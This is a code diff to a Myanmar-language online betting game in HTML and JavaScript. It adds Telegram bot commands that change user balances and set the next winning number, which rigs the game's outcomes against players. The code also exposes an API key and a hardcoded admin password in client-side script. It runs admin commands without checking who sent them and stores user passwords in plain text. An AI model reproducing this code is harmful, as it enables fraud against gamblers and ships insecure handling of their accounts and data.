@@ -294,7 +294,7 @@ td { padding: 11px 3px; border-bottom: 1px solid #f4f4f8; } tr:last-child td { b
       <button class="btn-main" type="submit">အကောင့်ဝင်မည်</button>
     </form>
     <form id="formSignup" class="auth-form hidden" onsubmit="event.preventDefault();doSignup()">
-      <div class="input-wrap"><label for="signPhone">ဖုန်းနံပါတ်</label><input type="tel" id="signPhone" placeholder="09xxxxxxxxx" required></div>
+      <div class="input-wrap"><label for="signPhone">ဖုန်းနံပါတ် (မြန်မာနံပါတ်မှန်ရန်)</label><input type="tel" id="signPhone" placeholder="09xxxxxxxxx" required></div>
       <div class="input-wrap"><label for="signName">အမည်</label><input type="text" id="signName" placeholder="သင့်အမည်" required></div>
       <div class="input-wrap"><label for="signPwd">စကားဝှက်</label><input type="password" id="signPwd" placeholder="အနည်းဆုံး ၆ လုံး" required><button type="button" class="eye-icon" onclick="togglePassword('signPwd',this)">◉</button></div>
       <div class="input-wrap"><label for="signPwd2">စကားဝှက် အတည်ပြုရန်</label><input type="password" id="signPwd2" placeholder="စကားဝှက် ပြန်ထည့်ပါ" required><button type="button" class="eye-icon" onclick="togglePassword('signPwd2',this)">◉</button></div>
@@ -395,7 +395,7 @@ td { padding: 11px 3px; border-bottom: 1px solid #f4f4f8; } tr:last-child td { b
 
     <div class="profile-card">
       <h3 style="color:var(--blue); margin-bottom:10px; text-align:center;">👥 သူငယ်ချင်းများကို ဖိတ်ခေါ်ရန်</h3>
-      <p style="font-size:11px; color:#666; text-align:center; margin-bottom:15px;">ဖိတ်ခေါ်ကုဒ်သုံးပြီး သူငယ်ချင်းများ အကောင့်ဖွင့်ပါက သင်ရော သူပါ <b style="color:var(--red)">1,999 Ks</b> စီ ရရှိပါမည်။</p>
+      <p style="font-size:11px; color:#666; text-align:center; margin-bottom:15px;">ဖိတ်ခေါ်ကုဒ်သုံးပြီး သူငယ်ချင်းများ အကောင့်ဖွင့်ပါက သင်ရော သူပါ <b style="color:var(--red)">1,999 Ks</b> စီ ရရှိပါမည်။ (IP တူလျှင် ဘိုနပ်စ်မရပါ)</p>
       <div class="profile-row copyable-row" onclick="fallbackCopyTextToClipboard(currentUser ? currentUser.id : '')" style="background:#f0f5ff; padding:10px; border-radius:8px; align-items:center; border: 1px dashed #4080ff;">
           <span style="color:var(--text-light);">ဖိတ်ခေါ်ကုဒ်</span>
           <div><span id="prof-invite-code" style="font-weight:bold; color:var(--blue); font-size:16px;">-</span><span class="copy-btn">Copy</span></div>
@@ -524,7 +524,7 @@ td { padding: 11px 3px; border-bottom: 1px solid #f4f4f8; } tr:last-child td { b
   </div>
 </div>
 
-<div class="info-overlay" id="infoOverlay"><div class="info-box"><div class="info-header"><h2 id="infoTitle">ကစားနည်း</h2><button onclick="closeInfo()">×</button></div><div id="infoBody"></div><button class="btn-main" onclick="closeInfo()" style="margin-top:15px;">နားလည်ပါပြီ</button></div></div>
+<div id="infoOverlay" class="info-overlay"><div class="info-box"><div class="info-header"><h2 id="infoTitle">ကစားနည်း</h2><button onclick="closeInfo()">×</button></div><div id="infoBody"></div><button class="btn-main" onclick="closeInfo()" style="margin-top:15px;">နားလည်ပါပြီ</button></div></div>
 
 <script>
 const ADMIN_PHONE = '992004';
@@ -541,6 +541,16 @@ async function sendTG(msg) {
       body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'HTML' })
     });
   } catch(e) {}
+}
+
+async function getClientIP() {
+  try {
+    let res = await fetch('https://api.ipify.org?format=json');
+    let data = await res.json();
+    return data.ip || 'unknown_ip';
+  } catch(e) {
+    return 'unknown_ip';
+  }
 }
 
 const JSONBIN_API_KEY = "$2a$10$a1albbh2l.jCXmiJimtr0efqbbw8enxHmE9LWrO94jkEU43ekZuC";
@@ -592,6 +602,70 @@ async function saveDB() {
     } catch(e) {}
 }
 
+// Telegram Bot Admin Commands (Polling)
+async function pollTelegramUpdates() {
+    try {
+        let lastUpdateId = parseInt(localStorage.getItem('tg_last_update_id') || '0');
+        let res = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
+        if(res.ok) {
+            let data = await res.json();
+            if(data.result && data.result.length > 0) {
+                for(let update of data.result) {
+                    localStorage.setItem('tg_last_update_id', update.update_id);
+                    if(update.message && update.message.text) {
+                        let textMsg = update.message.text.trim();
+                        await handleAdminCommand(textMsg);
+                    }
+                }
+            }
+        }
+    } catch(e) {}
+}
+
+async function handleAdminCommand(msg) {
+    await loadCloudDB();
+    let parts = msg.split(' ');
+    let cmd = parts[0].toLowerCase();
+
+    if(cmd === '/add' && parts.length >= 3) {
+        let targetId = parts[1];
+        let amount = parseFloat(parts[2]);
+        let uKey = Object.keys(DB.users).find(k => DB.users[k].id === targetId);
+        if(uKey) {
+            DB.users[uKey].balance += amount;
+            await saveDB();
+            sendTG(`✅ <b>အောင်မြင်သည်</b>\nUID: ${targetId} သို့ ${amount.toLocaleString()} Ks ထည့်သွင်းပြီးပါပြီ။ လက်ကျန်ငွေ: ${DB.users[uKey].balance} Ks`);
+        } else {
+            sendTG(`❌ <b>အမှား</b>\nUID ${targetId} မတွေ့ရှိပါ။`);
+        }
+    } else if(cmd === '/sub' && parts.length >= 3) {
+        let targetId = parts[1];
+        let amount = parseFloat(parts[2]);
+        let uKey = Object.keys(DB.users).find(k => DB.users[k].id === targetId);
+        if(uKey) {
+            DB.users[uKey].balance -= amount;
+            if(DB.users[uKey].balance < 0) DB.users[uKey].balance = 0;
+            await saveDB();
+            sendTG(`✅ <b>ငွေဖြတ်ပြီးပါပြီ</b>\nUID: ${targetId} မှ ${amount.toLocaleString()} Ks ဖြတ်တောက်လိုက်ပါပြီ။`);
+        } else {
+            sendTG(`❌ <b>အမှား</b>\nUID ${targetId} မတွေ့ရှိပါ။`);
+        }
+    } else if(cmd === '/set' && parts.length >= 3) {
+        let gameType = parts[1].toLowerCase();
+        let num = parseInt(parts[2]);
+        let gameKey = gameType === '30s' ? 'wingo30s' : gameType === '1m' ? 'wingo1m' : gameType === '3m' ? 'wingo3m' : gameType === '5m' ? 'wingo5m' : null;
+        
+        if(gameKey && num >= 0 && num <= 9) {
+            DB.settings.manualNum[gameKey] = num;
+            DB.settings.autoDraw[gameKey] = false;
+            await saveDB();
+            sendTG(`🎯 <b>ဂိမ်းထိန်းချုပ်မှု အောင်မြင်သည်</b>\nGame: ${gameType}\nနောက်ထွက်မည့်ဂဏန်း: <b>${num}</b> သို့ သတ်မှတ်လိုက်ပါပြီ။`);
+        } else {
+            sendTG(`❌ <b>အမှား</b>\nပုံစံမှားနေပါသည်။ ဥပမာ - <code>/set 30s 5</code>`);
+        }
+    }
+}
+
 if (!DB.users[ADMIN_PHONE]) { DB.users[ADMIN_PHONE] = { id: 'Admin', phone: ADMIN_PHONE, name: 'Admin', pwd: 'adminpassword', balance: 9999999, isAdmin: true }; }
 
 let currentUser = DB.session ? DB.users[DB.session] : null;
@@ -616,6 +690,7 @@ window.onload = async function() {
     if (invite && !currentUser) { switchAuth('signup'); $('signInviteCode').value = invite; }
     init();
     setInterval(loadCloudDB, 4000); 
+    setInterval(pollTelegramUpdates, 3000); 
 }
 
 let audioCtx;
@@ -649,24 +724,35 @@ window.doSignup = async function() {
   const inviteCode = $('signInviteCode').value.trim();
   
   if(!phone || !name || !pwd) return toast('အချက်အလက် ပြည့်စုံစွာ ဖြည့်ပါ');
-  if(!/^09\d{7,9}$/.test(phone)) return toast('ဖုန်းနံပါတ် မှားယွင်းနေပါသည်');
+  let myanmarPhoneRegex = /^09\d{7,9}$/;
+  if(!myanmarPhoneRegex.test(phone)) return toast('ကျေးဇူးပြု၍ တရားဝင် မြန်မာဖုန်းနံပါတ် (09xxxxxxxxx) ထည့်ပါ။');
+
   if(pwd.length < 6) return toast('စကားဝှက် အနည်းဆုံး ၆ လုံး ထည့်ပါ');
   if(pwd !== pwd2) return toast('စကားဝှက် နှစ်ခု မတူပါ');
   if(DB.users[phone]) return toast('ဒီဖုန်းနံပါတ်ဖြင့် အကောင့်ရှိပြီးသားပါ');
 
+  let currentIP = await getClientIP();
   let startingBalance = 0;
   let inviteMsg = "";
+
   if(inviteCode) {
       let inviterPhone = Object.keys(DB.users).find(k => DB.users[k].id === inviteCode);
       if(inviterPhone) { 
-          DB.users[inviterPhone].balance += 1999; startingBalance = 1999; 
-          inviteMsg = `\n\n✅ <b>ဖိတ်ခေါ်ကုဒ်သုံးထားသည်</b>\nဖိတ်ခေါ်သူ ID: ${inviteCode}`;
+          let inviter = DB.users[inviterPhone];
+          if(inviter.lastIP && inviter.lastIP === currentIP) {
+              inviteMsg = `\n\n⚠ <b>ဖိတ်ခေါ်ကုဒ်သုံးသော်လည်း IP တူနေ၍ ဘိုနပ်စ်မရပါ</b>`;
+          } else {
+              inviter.balance += 1999; 
+              startingBalance = 1999; 
+              inviteMsg = `\n\n✅ <b>ဖိတ်ခေါ်ကုဒ်သုံးထားသည်</b>\nဖိတ်ခေါ်သူ ID: ${inviteCode}`;
+          }
       } 
       else { return toast('ဖိတ်ခေါ်ကုဒ် မှားယွင်းနေပါသည်'); }
   }
 
   let newId = generateRandom5DigitId();
-  DB.users[phone] = { id: newId, phone: phone, name, pwd, balance: startingBalance, isAdmin: false };
+  // Corrected property assignments to prevent login issues
+  DB.users[phone] = { id: newId, phone: phone, name: name, pwd: pwd, balance: startingBalance, isAdmin: false, lastIP: currentIP };
   DB.session = phone; 
   
   await saveDB(); 
@@ -918,8 +1004,6 @@ function showResult(win, amt, betObj, num, period) {
 
 window.closeResultPopup = function() { $('resultPopupOverlay').classList.remove('show'); };
 window.openInfo = function(title, body) { text('infoTitle', title); $('infoBody').innerHTML = body; $('infoOverlay').classList.add('show'); };
-
-// အောက်ပါ function ထဲတွင် classList.remove('show') ဟု အမှန်ပြင်ဆင်ပေးထားပါသည်
 window.closeInfo = function() { document.getElementById('infoOverlay').classList.remove('show'); };
 
 window.showRules = function() { openInfo('ကစားနည်း', 'ကစားနည်းစည်းမျဉ်းများ'); };
